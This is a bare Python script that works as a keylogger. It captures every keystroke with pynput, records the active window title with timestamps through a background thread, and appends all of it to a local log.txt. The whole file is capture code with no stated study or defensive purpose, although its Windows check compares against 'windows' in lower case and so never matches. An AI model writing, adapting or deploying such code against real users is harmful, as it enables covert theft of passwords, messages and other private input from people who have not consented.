from pynput import keyboard
import time
import threading
import platform

if platform.system()=="windows":
    import win32gui
elif platform.system()=="Linux":
    import subprocess
def active_get_windows():
    try:
        if platform.system()=="windows":
            window=win32gui.GetForegroundWindow()
            title=win32gui.GetWindowText(window)
            return title
        elif platform.system()=="Linux":
            window=subprocess.check_output(['xdotool','getwindowfocus','getwindowname'])
            return window.decode('utf-8').strip()
        else :
            return "Unsupported OS"
    except:
        return "Unkown window"
current_window=""
def track_window_change():
    global current_window
    while True:
        new_window=active_get_windows()
        if new_window!=current_window:
            current_window=new_window
            with open("log.txt","a",encoding="utf-8") as f:
                f.write(f"\n\n[{current_window}]-{time.ctime()}\n")
        time.sleep(1)
        
def on_press(key):
    try :
        log=f"{key.char}"
    except AttributeError:
        log=f"[{key.name}]"
    with open("log.txt","a",encoding="utf-8") as f:
        f.write(log)

window_thread=threading.Thread(target=track_window_change)
window_thread.daemon=True
window_thread.start()

listener=keyboard.Listener(on_press=on_press)
listener.start()

listener.join()
